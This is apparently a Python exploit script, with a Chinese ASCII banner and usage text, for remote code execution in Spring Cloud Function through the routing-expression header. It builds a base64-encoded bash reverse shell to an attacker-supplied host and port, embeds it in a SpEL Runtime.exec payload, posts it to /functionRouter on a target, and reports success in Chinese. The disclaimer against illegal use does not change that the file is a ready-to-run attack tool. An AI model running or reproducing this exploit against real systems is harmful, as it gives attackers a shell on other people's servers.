import requests
import sys
import base64
import urllib3
urllib3.disable_warnings()

a ='''
                     $$                             $$                  $$                                 
  $$$                $$     $$$$$    $$$   $$$$$    $$                  $$         $$$$$  $$  $$  $$$$$    
 $$  $               $$     $$  $$  $$  $  $$       $$                  $$         $$     $$  $$  $$  $$   
 $$    $$$$$   $$$$  $$     $$  $$  $$     $$       $$$$$   $$$$   $$$$ $$$$$      $$      $$$$   $$  $$   
  $$$  $$  $$ $$  $$ $$     $$$$$   $$     $$$$$    $$  $$     $$ $$    $$  $$     $$$$$    $$    $$  $$   
    $$ $$  $$ $$$$$$ $$     $$ $$   $$     $$       $$  $$  $$$$$ $$$$$ $$  $$     $$      $$$$   $$$$$    
 $  $$ $$  $$ $$     $$     $$  $$  $$  $  $$       $$  $$ $$  $$    $$ $$  $$     $$     $$  $$  $$       
  $$$  $$$$$   $$$$$ $$     $$   $$  $$$   $$$$$    $$$$$   $$$$$ $$$$  $$  $$     $$$$$  $$  $$  $$       
       $$                                                                                                  
       $$                                                                                                  
                                                                by 欢迎关注chaosec公众号 禁止一切违法！！！
'''

print(a)
print(' ')

def bash(url,ip,port):

    cmd ='bash -i >&/dev/tcp/'+ip+'/'+port+' 0>&1'
    cmd = cmd.encode('utf-8')
    cmd = str(base64.b64encode(cmd))
    cmd = cmd.strip('b')
    cmd = cmd.strip("'")
    cmd = 'bash -c {echo,' + cmd + '}|{base64,-d}|{bash,-i}'

    payload=f'T(java.lang.Runtime).getRuntime().exec("{cmd}")'

    data ='test'
    headers = {
        'spring.cloud.function.routing-expression':payload,
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    path = '/functionRouter'

    # print(all)
    all = url + path
    try:
        req=requests.post(url=all,headers=headers,data=data,verify=False,timeout=3)
        code =req.status_code
        text = req.text
        rsp = '"error":"Internal Server Error"'

        if code == 500 and rsp in text:
            print(f'[+]{url} 存在漏洞')
            print('正在尝试反弹shell...')
        else:
            print(f'[-]{url} 不存在漏洞')

    except requests.exceptions.RequestException:
        print(f'[-]{url} 检测超时')
        pass
    except:
        print(f'[-]{url} 检测异常')
        pass



if __name__ == '__main__' :
    try:
        cmd1 =sys.argv[1]
        cmd2 =sys.argv[2]
        cmd3 =sys.argv[3]
        bash(cmd1,cmd2,cmd3)
    except:
        print('用法：')
        print('python demo.py url lhost lport')
        pass
      
##########################
##
##      
